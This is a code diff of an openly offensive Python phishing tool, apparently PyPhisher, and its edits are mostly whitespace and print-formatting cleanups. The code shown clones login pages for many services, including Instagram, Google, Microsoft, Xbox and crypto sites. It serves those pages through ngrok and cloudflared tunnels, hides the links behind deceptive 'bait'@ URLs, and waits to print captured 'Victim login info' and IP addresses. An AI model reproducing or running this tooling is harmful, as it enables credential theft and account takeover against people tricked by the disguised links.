@@ -191,14 +191,14 @@ def slowprint(n):
         sys.stdout.flush()
         time.sleep(0.01)
 
-# Print lines        
+# Print lines
 def sprint(n):
     for word in n + '\n':
         sys.stdout.write(word)
         sys.stdout.flush()
         time.sleep(0.05)
-        
-# Internet Checker        
+
+# Internet Checker
 def internet(host="8.8.8.8", port=53, timeout=5):
     try:
         socket.setdefaulttimeout(timeout)
@@ -208,6 +208,7 @@ def internet(host="8.8.8.8", port=53, timeout=5):
         time.sleep(2)
         internet()
 
+# Ask to mask url
 def cuask(url):
     cust= input("\n"+ask+bcyan+"Wanna try custom link?(y or press enter to skip) > ")
     if not cust=="":
@@ -226,14 +227,14 @@ def about():
     print(red+'[Email]     '+cyan+' :[kasroudrakrd@gmail.com]')
     print()
     print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
-    print()    
+    print()
     abot= input("\n > ")
     if abot== "0":
         exit()
     else:
         main()
-        
-# First function main        
+
+# First function main
 def main():
     os.system("clear")
     os.system("stty -echoctl")
@@ -256,7 +257,7 @@ def main():
         elif choose == "4" or choose == "04":
             folder="fb_messenger"
             mask='https://get-messenger-premium-features-free'
-            requirements(folder,mask)            
+            requirements(folder,mask)
         elif choose == "5" or choose == "05":
             folder="instagram"
             mask='https://get-unlimited-followers-for-instagram'
@@ -264,15 +265,15 @@ def main():
         elif choose == "6" or choose== "06":
             folder="ig_followers"
             mask='https://get-unlimited-followers-for-instagram'
-            requirements(folder,mask)    
+            requirements(folder,mask)
         elif choose == "7" or choose == "07":
             folder="insta_followers"
             mask='https://get-1000-followers-for-instagram'
-            requirements(folder,mask)    
+            requirements(folder,mask)
         elif choose == "8" or choose == "08":
             folder="ig_verify"
             mask='https://blue-badge-verify-for-instagram-free'
-            requirements(folder,mask)                
+            requirements(folder,mask)
         elif choose == "9" or choose == "09":
             folder="google"
             mask='https://get-unlimited-google-drive-free'
@@ -284,7 +285,7 @@ def main():
         elif choose == "11":
             folder="google_poll"
             mask='https://vote-for-the-best-social-media'
-            requirements(folder,mask)                           
+            requirements(folder,mask)
         elif choose == "12":
             folder="microsoft"
             mask='https://unlimited-onedrive-space-for-free'
@@ -388,7 +389,7 @@ def main():
         elif choose == "37":
             folder="youtube"
             mask='https://get-1k-like-in-any-video'
-            requirements(folder,mask)               
+            requirements(folder,mask)
         elif choose == "38":
             folder="airtelsim"
             mask='https://get-500-cureency-free-to-your-account'
@@ -440,7 +441,7 @@ def main():
         elif choose == "50":
             folder="vk_pole"
             mask='https://vote-for-the-best-social-media'
-            requirements(folder,mask)               
+            requirements(folder,mask)
         elif choose == "51":
             folder="xbox"
             mask='https://get-500-usd-free-to-your-acount'
@@ -468,7 +469,7 @@ def main():
         elif choose == "57":
             folder="shopify"
             mask='https://get-50%-discount-on-any-sale'
-            requirements(folder,mask)            
+            requirements(folder,mask)
         elif choose == "58":
             folder="myspace"
             mask='https://get-1k-followers-on-myspace-free-free'
@@ -480,7 +481,7 @@ def main():
         elif choose == "60":
             folder="cryptocurrency"
             mask='https://get-bitcoins-free'
-            requirements(folder,mask)               
+            requirements(folder,mask)
         elif choose == "61":
             folder="snapchat2"
             mask='https://view-locked-snapchat-accounts-secretly'
@@ -516,7 +517,7 @@ def requirements(folder,mask):
         system("apt install unzip -y")
     if system("command -v wget > /dev/null 2>&1")!=0:
         sprint(info+"Installing wget.....")
-        system("apt install wget -y")            
+        system("apt install wget -y")
     if system("command -v curl > /dev/null 2>&1")!=0:
         sprint(info+"Installing curl....")
         system("apt install curl -y")
@@ -540,14 +541,14 @@ def requirements(folder,mask):
             system("tar -zxf file.zip > /dev/null 2>&1")
             os.remove("file.zip")
             system("chmod +x ngrok && mkdir "+root+"/.ngrokfolder")
-            system("mv -f ngrok "+root+"/.ngrokfolder")            
+            system("mv -f ngrok "+root+"/.ngrokfolder")
             break
         if x.find("arm")!=-1:
             urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip", "file.zip", reporthook)
             system("unzip file.zip > /dev/null 2>&1")
             os.remove("file.zip")
             system("chmod +x ngrok && mkdir "+root+"/.ngrokfolder")
-            system("mv -f ngrok "+root+"/.ngrokfolder")            
+            system("mv -f ngrok "+root+"/.ngrokfolder")
             break
         if x.find("x86_64")!=-1:
             urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip", "file.zip", reporthook)
@@ -569,12 +570,12 @@ def requirements(folder,mask):
         if x.find("aarch64")!=-1:
             urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", "cloudflared", reporthook)
             system("chmod +x cloudflared && mkdir "+root+"/.cffolder")
-            system("mv -f cloudflared "+root+"/.cffolder")            
+            system("mv -f cloudflared "+root+"/.cffolder")
             break
         if x.find("arm")!=-1:
             urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", "cloudflared", reporthook)
             system("chmod +x cloudflared && mkdir "+root+"/.cffolder")
-            system("mv -f cloudflared "+root+"/.cffolder")            
+            system("mv -f cloudflared "+root+"/.cffolder")
             break
         if x.find("x86_64")!=-1:
             urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared", reporthook)
@@ -590,7 +591,7 @@ def requirements(folder,mask):
         exit()
     if system("pidof ngrok > /dev/null 2>&1")==0:
         sprint(error+"Previous ngrok still running. Please restart terminal and try again")
-        exit()    
+        exit()
     while True:
         if os.path.exists(root+"/.site"):
             system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
@@ -623,6 +624,8 @@ def requirements(folder,mask):
     system("mv -f .info.txt $HOME/.site")
     system("clear")
     slowprint(logo)
+    if termux:
+        sprint("\n"+info+"If you haven't enabled hotspot, please enable it!")
     sprint("\n"+info2+"Initializing PHP server at localhost:8080....")
     internet()
     system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
@@ -643,7 +646,7 @@ def requirements(folder,mask):
             system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
             system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
             break
-        else:    
+        else:
             system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
             system("cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
             break
@@ -680,7 +683,7 @@ def requirements(folder,mask):
             sprint(error+"Unknown error!")
             killer()
             exit()
-    
+
 
 # Optional function for ngrok url masking
 def masking(url):
@@ -698,20 +701,20 @@ def masking(url):
         bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
         if (bait==""):
             sprint("\n"+error+"No bait word!")
-            sprint("\n"+success+"Your url is > https://"+ main)          
+            sprint("\n"+success+"Your url is > https://"+ main)
             waiter()
         if bait.find(" ")!=-1:
             sprint("\n"+error+"Space in bait word!")
             waiter()
         final= "https://"+bait+"@"+main
-        sprint("\n"+success+"Your url is > "+ final)           
+        sprint("\n"+success+"Your url is > "+ final)
         waiter()
     if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
         bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
         if (bait==""):
             sprint("\n"+error+"No bait word!")
             final= domain+"@"+main
-            sprint("\n"+success+"Your url is > "+ final)          
+            sprint("\n"+success+"Your url is > "+ final)
             waiter()
         if bait.find(" ")!=-1:
             sprint("\n"+error+"Space in bait word!")
@@ -725,7 +728,7 @@ def masking(url):
         if bait=="":
             sprint("\n"+error+"No bait word!")
             final= domain+"@"+main
-            sprint("\n"+success+"Your url is > "+ final)          
+            sprint("\n"+success+"Your url is > "+ final)
             waiter()
         if bait.find(" ")!=-1:
             sprint("\n"+error+"Space in bait word!")
@@ -739,26 +742,26 @@ def url_manager(url,num1,num2):
     internet()
     with open(root+"/.site/.info.txt", "r") as inform:
         masked=inform.read()
-        
+
     sprint("\n"+success+"Your urls are given below: \n")
     system("rm -rf $HOME/.site/ip.txt")
     print(info2+"URL "+num1+" > "+yellow+url)
     print(info2+"URL "+num2+" > "+yellow+masked.strip()+"@"+url.replace("https://",""))
 
 
-# Last function capturing credentials 
+# Last function capturing credentials
 def waiter():
     sprint("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
     try:
         while True:
             if os.path.isfile(root+"/.site/usernames.txt"):
-                print("\n\n\n"+success+bgreen+"Victim login info found!\n\007")
+                print("\n\n"+success+bgreen+"Victim login info found!\n\007")
                 with open(root+"/.site/usernames.txt","r") as ufile:
                     userdata=ufile.readlines()
                     j=0
                     o=len(userdata)
                     while j<o:
-                        print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j])
+                        print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j],end="")
                         j+=1
                 print("\n"+info+"Saved in usernames.txt")
                 print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
@@ -774,7 +777,7 @@ def waiter():
                     h=0
                     p=len(ipdata)
                     while h<p:
-                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h])
+                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                         h+=1
                 print("\n"+info+"Saved in ip.txt")
                 print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
@@ -785,8 +788,8 @@ def waiter():
         sprint("\n"+info+"Thanks for using. Have a good day!\n")
         exit(0)
 
-if __name__ == '__main__':        
-  try:       
+if __name__ == '__main__':
+  try:
       main()
   except KeyboardInterrupt:
       killer()
